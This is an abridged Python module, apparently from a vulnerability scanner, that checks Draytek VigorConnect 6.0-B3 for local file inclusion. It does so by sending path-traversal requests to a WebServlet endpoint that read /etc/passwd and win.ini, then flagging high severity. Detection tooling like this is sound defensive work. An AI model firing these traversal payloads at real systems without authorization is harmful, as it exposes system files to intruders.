...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Draytek VigorConnect 6.0-B3 - Local File Inclusion Detection',
    ...
    def run(self):
        for path in ('/ACSServer/WebServlet?act=getMapImg_acs2&filename=../../../../../../../etc/passwd', '/ACSServer/WebServlet?act=getMapImg_acs2&filename=../../../../../../../windows/win.ini'):
            ...
            if (any(m in headers for m in header_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason="Draytek VigorConnect 6.0-B3 - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False
